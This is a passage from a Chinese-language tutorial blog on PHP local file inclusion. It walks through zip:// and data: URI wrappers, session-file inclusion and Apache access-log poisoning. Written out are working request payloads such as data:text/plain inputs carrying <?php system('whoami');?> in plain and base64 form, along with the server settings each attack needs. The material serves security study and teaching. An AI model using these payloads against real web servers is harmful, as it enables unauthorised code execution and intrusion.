/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">但使用zip协议，需要指定绝对路径，同时将</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">#</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">编码为</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">%23</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，之后填上压缩包内的文件。</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 1181px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 1181px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/11.png" height="290" width="1047"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">若是使用相对路径，则会包含失败。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">data:URI schema</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php版本大于等于php5.2</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_fopen = On</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_include = On</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势一：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 885px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 885px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/6.png" height="318" width="1016"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">执行命令：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 966px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 966px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=data:text/plain,&lt;?php system('whoami');?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势二：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 852px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 852px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">加号</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">+</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">的url编码为</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">%2b</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">PD9waHAgcGhwaW5mbygpOz8+</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">的base64解码为：</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">&lt;?php phpinfo();?&gt;</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/7.png" height="276" width="1037"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">执行命令：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 848px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 848px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">其中</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">的base64解码为：</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">&lt;?php system('whoami');?&gt;</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含session</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：session文件路径已知，且其中内容部分可控。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php的session文件的保存路径可以在phpinfo的session.save_path看到。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/14.png" height="133" width="1238"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在默认情况下一般是保存在</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">/tmp</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">目录中。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/16.png" height="243" width="1032"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">比如这篇文章：</span><a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">透過 LFI 引入 PHP session 檔案觸發 RCE</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含日志</span></h2><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">访问日志</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/12.png" height="269" width="686"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/13.png" height="115" width="999"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
